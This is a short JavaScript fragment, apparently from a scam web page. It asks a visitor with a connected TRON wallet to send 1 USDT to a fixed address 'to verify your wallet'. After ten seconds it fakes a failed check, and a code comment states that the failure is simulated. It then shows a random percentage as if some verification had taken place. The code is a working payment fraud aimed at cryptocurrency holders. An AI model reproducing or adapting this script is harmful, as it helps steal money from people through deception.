function connectWallet() {
  if (window.tronWeb && window.tronWeb.ready) {
    const addr = window.tronWeb.defaultAddress.base58;
    document.getElementById('status').innerHTML = `
      ✅ Connected: ${addr}<br>
      Please send <strong>1 USDT</strong> to <br><strong style="color:#00ffae;">TS99jGZnn4M5sMoT4GQLDmcmHbZvACGWeh</strong><br> to verify your wallet.
    `;
    setTimeout(showFailed, 10000); // simulate failure after 10s
  } else {
    alert("⚠️ Please open this page inside Trust Wallet dApp browser or TronLink.");
  }
}

function showFailed() {
  const pct = Math.floor(Math.random() * 41) + 50;
  document.getElementById('percent').textContent = pct + '%';
  document.getElementById('status').classList.add('hidden');
  document.getElementById('result').classList.remove('hidden');
}
